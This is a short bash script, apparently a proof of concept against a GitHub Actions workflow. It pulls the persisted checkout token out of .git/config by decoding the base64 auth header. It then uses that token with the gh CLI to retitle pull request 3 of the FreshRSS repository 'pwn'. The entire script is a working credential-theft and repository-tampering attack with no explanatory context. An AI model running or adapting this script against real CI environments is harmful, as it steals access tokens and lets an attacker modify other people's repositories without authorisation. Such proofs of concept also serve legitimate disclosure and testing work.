#!/bin/bash
export GITHUB_TOKEN="$(grep -oP 'basic \K[^$]*' .git/config | base64 -d | sed 's/x-access-token://')"

gh repo set-default Inverle/FreshRSS
gh pr edit 3 -t "pwn"
